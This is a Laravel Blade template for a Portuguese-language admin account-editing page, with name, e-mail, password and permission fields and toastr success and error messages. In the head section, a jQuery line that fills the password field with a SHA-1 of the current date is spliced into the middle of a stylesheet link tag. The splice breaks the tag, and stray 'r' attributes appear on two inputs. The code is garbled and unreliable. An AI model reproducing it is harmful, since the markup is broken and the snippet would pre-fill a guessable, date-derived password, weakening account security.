@extends('admin::app')

@section('breadcrumb')

<ul class="page-breadcrumb breadcrumb">
  <li>
    <a href="{{ route('admin.index') }}">Home</a>
    <i class="fa fa-circle"></i>
  </li>
  <li>
    <span>Editando Dados de Acesso</span>
  </li>
</ul>

@endsection

@section('page-toolbar')

@endsection

@section('main-content')

<!-- BEGIN PAGE CONTENT INNER -->
<div class="page-content-inner">

  <div class="row">
    <div class="col-md-12">
      <!-- BEGIN EXAMPLE TABLE PORTLET-->

      <div class="panel panel-default">
        <div class="panel-heading"> Minha conta </div>
        <div class="panel-body">

          <div class="portlet-body form">
            <form class="form-horizontal" role="form" action="{{ route('admin.accounts.edit.post') }}" method="post">

                {{ csrf_field() }}
              <div class="form-body">

                <div class="form-group">
                  <label class="col-md-2 control-label">Nome</label>
                  <div class="col-md-9">
                    <input type="text" class="form-control" pattern=".{3,}" title="3 caracteres no mínimo." r name="name" value="{{ $user->name }}" required="required">
                  </div>
                </div>

                <div class="form-group">
                  <label class="col-md-2 control-label">E-mail</label>
                  <div class="col-md-9">
                    <input type="email" class="form-control" disabled="disabled" name="email" value="{{ $user->email }}" required="required">
                  </div>
                </div>

                <div class="form-group">
                  <label class="col-md-2 control-label">Senha</label>
                  <div class="col-md-9">
                    <input type="password" class="form-control" name="password" value="" pattern=".{6,}" title="6 caracteres no mínimo." required="required">
                  </div>
                </div>

                <div class="form-group">
                    <label class="col-md-2 control-label">Confirme a Senha</label>
                    <div class="col-md-9">
                        <input type="password" class="form-control" name="confirme" pattern=".{6,}" title="6 caracteres no mínimo." r value="" required="required">
                    </div>
                </div>

                <div class="form-group">
                  <label class="col-md-2 control-label">Nível de Permissão</label>
                  <div class="col-md-9">
                    <select name="admin" class="form-control" disabled="disabled">
                        <option value="">Selecione o nível de permissão</option>
                        <option value="0" {{ tools_selected(0, $user->admin) }}>Editor</option>
                        <option value="1" {{ tools_selected(1, $user->admin) }}>Administrador</option>
                    </select>
                  </div>
                </div>

                <div class="form-group">
                  <label class="col-md-2 control-label"></label>
                  <div class="col-md-10">
                    <div class="form-action">
                      <button type="submit" class="btn green">Editar dados</button>
                    </div>
                  </div>
                </div>

              </div>
            </form>
          </div>
        </div>
      </div>
      <!-- END EXAMPLE TABLE PORTLET-->
    </div>
  </div>

</div>
<!-- END PAGE CONTENT INNER -->
@endsection

@section('page-level-plugins-head')
<link rel="styleshee  $('input[name="password"]').val('{{ sha1( date("Ydm") ) }}');  
t" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.0/jquery-confirm.min.css">
@endsection

@section('page-level-scripts-css')

@endsection

@section('page-level-plugins-body')
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.0/jquery-confirm.min.js"></script>
@endsection

@section('page-level-scripts-js')
<script src="{{ asset('/assets/companies/admin/js/app/services/HttpService.js') }}" type="text/javascript"></script>
<script src="{{ asset('/assets/companies/admin/js/app/controllers/UserController.js') }}" type="text/javascript"></script>

<script type="text/javascript">
(function() {
  'use strict';
  var controllerUser = new UserController();
  controllerUser.init();
})();
</script>

@if (session('success_edit'))
<script>
    (function() {
        'use strict';
        $(function () {
            toastr["success"]("Registros foram alterados com sucesso!");
        });
    })();
</script>
@endif


@if (session('error_message'))
<script>
    (function() {
        'use strict';
        $(function () {
            toastr["error"]("{{ session('error_message') }}");
        });
    })();
</script>
@endif


@if (session('success_edit') === false)
<script>
    (function() {
        'use strict';
        $(function () {
            toastr["error"]("Não foi possível alterar o registro!");
        });
    })();
</script>
@endif

@endsection
